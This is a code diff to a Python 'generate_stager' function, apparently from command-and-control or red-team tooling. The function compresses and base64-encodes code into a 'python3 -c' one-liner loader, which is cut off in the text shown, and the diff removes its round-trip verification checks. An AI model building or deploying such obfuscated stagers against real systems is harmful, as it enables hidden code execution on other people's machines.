@@ -71,26 +71,7 @@ def generate_stager(config, template, client_publish_item, payload_publish_item)
 
     minified_bytes = minified.encode("ascii")
     compressed = zlib.compress(minified_bytes, 9)
-    payload = base64.b64encode(compressed)
-
-    try:
-        payload.decode("ascii")
-    except (UnicodeDecodeError, ValueError):
-        raise StartupError(
-            "startup",
-            "stager_generation_failed",
-            "base64 payload is not valid ASCII",
-        )
-
-    roundtrip = zlib.decompress(base64.b64decode(payload))
-    if roundtrip != minified_bytes:
-        raise StartupError(
-            "startup",
-            "stager_generation_failed",
-            "base64/zlib round-trip verification failed",
-        )
-
-    payload_str = payload.decode("ascii")
+    payload_str = base64.b64encode(compressed).decode("ascii")
     oneliner = (
         "python3 -c "
         '"import base64,zlib;'
